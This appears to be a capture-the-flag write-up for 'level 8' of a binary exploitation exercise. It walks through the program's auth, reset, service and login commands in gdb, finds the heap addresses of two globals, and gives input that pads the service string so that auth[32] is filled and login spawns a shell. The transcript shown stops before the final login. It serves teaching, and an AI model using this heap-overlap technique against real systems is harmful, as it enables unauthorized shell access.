level 8

like always we have we have an executable level8 that ask for input in a loop

lets debug using gdb

first thing we have 2 global variables auth and services

lets debug the main function :

create a buffer 128 in size after that we have an infinite loop that prints the address of the two variables auth and service
first condition : then use fgets to get an input if we dont give anything it breaks the loop and return
second condition : it compares the 5 first char of the  input with "auth " if it matches we allocate 4 to auth using malloc and we put 0 in aut[0]
then compares the size of the buffer+5 mean the after "auth " if its less or equal to 30 if so it copy the input+5 to auth
example if we give "auth asdads" as input our auh variable will contains "asdads"
third condition : it compares the first 5 char of the buffer with "reset" if it matches it use free to free auth
fourth condition : it compares the first 6 char of the buffer with "service" if it matches it use strdup to copy buffer+7 to the variable service
example if we give "serviceasdads" as input our service variable will contains "asdads"
the last consition : it compares the first 5 char of the buffer with "login" if it matches it check auth[32] if its empty if its empty it prints Password: else it calls system("/bin/sh")

so basically we need to put somthing in auth[32]
first thing we need to get the address of auth and service

(gdb)  b *0x080485f0  #break point after malloc call 
Breakpoint 1 at 0x80485f0
(gdb) r
Starting program: /home/user/level8/level8
(nil), (nil)
auth

Breakpoint 1, 0x080485f0 in main ()
(gdb) x $eax
0x804a008:	0x00000000
(gdb)

the address of auth is 0x804a008

now lets get the address of service

(gdb) b *0x080486b0 # break point after strdup call
Breakpoint 2 at 0x80486b0
(gdb) c
Continuing.
0x804a008, (nil)
service

Breakpoint 2, 0x080486b0 in main ()
(gdb) x $eax
0x804a018:	0x0000000a
(gdb)

the address of service is 0x804a018

the diff between the 2 addresses is 16

so basically in this examples auth[16] will contain '\n' so we need to add 16 other bytes after service

Continuing.
0x804a008, 0x804a018
serviceaaaaaaaaaaaaaaaa

Breakpoint 2, 0x080486b0 in main ()
(gdb) c
Continuing.
0x804a008, 0x804a028

we got shell in gdb now lets try it out 

level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
serviceaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
